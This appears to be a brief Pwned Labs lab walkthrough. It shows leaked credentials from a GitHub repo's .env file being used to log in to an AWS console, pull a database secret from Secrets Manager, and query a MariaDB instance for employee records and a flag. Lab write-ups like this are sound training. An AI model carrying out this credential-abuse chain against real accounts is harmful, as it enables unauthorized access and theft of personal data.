https://pwnedlabs.io/labs/leverage-leaked-credentials-for-pwnage

Github repo: `https://github.com/huge-logistics/aws-react-app`

`.env` contains the username, password, and a AWS Access Key. Get Account ID:

```bash
aws sts get-access-key-info --access-key-id <Access_Key>
	Account: XXXXXXXXXX
```

Now we can login with the user we saw in the `.env`, the username and password. We can login with that at the url: `https://<Account_ID>.signin.aws.amazon.com/console`

`Secrets Manager > Secrets > employee-database > Retrieve Secret Value`

We can see username and password for `mariadb`! Login:

```bash
mysql -h employees.cwqkzlyzmm5z.us-east-1.rds.amazonaws.com -P 3306 -D employees -u reports -p
```

```sql
show databases;
show tables;
select * from employees;
select * from flag;
```